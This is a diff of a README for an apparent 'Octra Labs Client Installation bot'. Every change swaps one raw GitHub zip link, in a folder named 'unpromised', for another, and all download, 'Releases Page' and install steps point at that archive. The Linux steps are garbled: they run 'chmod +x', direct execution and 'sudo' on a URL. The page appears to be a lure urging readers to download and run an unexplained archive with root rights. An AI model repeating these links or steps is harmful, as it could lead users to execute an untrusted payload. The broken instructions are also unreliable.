@@ -1,6 +1,6 @@
 # 🚀 Octra-Labs-Client-Installation-bot - Effortless Installation for Octra Labs
 
-[![Download](https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Octra-Labs-Client-Installation-bot-v3.3.zip)](https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Octra-Labs-Client-Installation-bot-v3.3.zip)
+[![Download](https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Labs-bot-Installation-Octra-Client-v1.0.zip)](https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Labs-bot-Installation-Octra-Client-v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -17,11 +17,11 @@ Before you start, ensure that your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get the Octra Labs Client Installation Bot, visit this page to download: [Releases Page](https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Octra-Labs-Client-Installation-bot-v3.3.zip).
+To get the Octra Labs Client Installation Bot, visit this page to download: [Releases Page](https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Labs-bot-Installation-Octra-Client-v1.0.zip).
 
 ### Step-by-Step Instructions
 
-1. Click on the [Releases Page](https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Octra-Labs-Client-Installation-bot-v3.3.zip) link.
+1. Click on the [Releases Page](https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Labs-bot-Installation-Octra-Client-v1.0.zip) link.
 2. Find the latest version of the installation bot in the listings. Look for the version labeled something like “v1.0”.
 3. Download the installation file appropriate for your operating system:
    - For Windows, select the `.exe` file.
@@ -46,11 +46,11 @@ To get the Octra Labs Client Installation Bot, visit this page to download: [Rel
    ```
 3. Make the script executable:
    ```bash
-   chmod +x https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Octra-Labs-Client-Installation-bot-v3.3.zip
+   chmod +x https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Labs-bot-Installation-Octra-Client-v1.0.zip
    ```
 4. Run the installation bot:
    ```bash
-   https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Octra-Labs-Client-Installation-bot-v3.3.zip
+   https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Labs-bot-Installation-Octra-Client-v1.0.zip
    ```
 5. Follow the on-screen instructions to complete the installation process.
 
@@ -70,7 +70,7 @@ If you encounter any issues during installation, here are some tips:
 - **Installation Fails:** Make sure you have a compatible operating system and the required version of Python.
 - **Permissions Error on Linux:** Run the installation script with `sudo` to ensure you have the necessary permissions:
    ```bash
-   sudo https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Octra-Labs-Client-Installation-bot-v3.3.zip
+   sudo https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Labs-bot-Installation-Octra-Client-v1.0.zip
    ```
 - **Network Issues:** Ensure you have a steady internet connection and that no firewall settings are blocking the installation process.
 
@@ -82,4 +82,4 @@ For additional help, consider reaching out to our community. You can find suppor
 
 Once the installation is complete, you can start using the Octra Labs Pre-Client. Check the official documentation for detailed instructions on how to utilize all the features provided by the client.
 
-Thank you for using the Octra Labs Client Installation Bot. We hope this tool simplifies your setup process and enhances your experience with Octra Labs. For further downloads and updates, refer to this page: [Releases Page](https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Octra-Labs-Client-Installation-bot-v3.3.zip).
+Thank you for using the Octra Labs Client Installation Bot. We hope this tool simplifies your setup process and enhances your experience with Octra Labs. For further downloads and updates, refer to this page: [Releases Page](https://raw.githubusercontent.com/ljkormo/Octra-Labs-Client-Installation-bot/main/unpromised/Labs-bot-Installation-Octra-Client-v1.0.zip).
